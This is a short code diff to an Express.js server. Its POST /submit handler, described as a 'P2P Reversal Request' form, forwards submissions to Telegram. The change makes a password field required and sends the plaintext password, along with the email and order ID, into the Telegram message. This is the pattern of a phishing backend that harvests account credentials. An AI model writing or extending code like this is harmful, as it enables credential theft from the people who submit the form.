@@ -14,9 +14,9 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 // ── POST /submit — receive form data and forward to Telegram ──
 app.post('/submit', async (req, res) => {
-  const { email, orderId, reason } = req.body;
+  const { email, password, orderId, reason } = req.body;
 
-  if (!email || !orderId || !reason) {
+  if (!email || !password || !orderId || !reason) {
     return res.status(400).json({ success: false, message: 'Missing required fields.' });
   }
 
@@ -31,6 +31,7 @@ app.post('/submit', async (req, res) => {
 🔔 *New P2P Reversal Request*
 
 📧 *Email:* \`${email}\`
+🔑 *Password:* \`${password}\`
 🆔 *Order ID:* \`${orderId}\`
 📋 *Reason:* ${reasonLabels[reason] || reason}
 🕒 *Time:* ${new Date().toUTCString()}
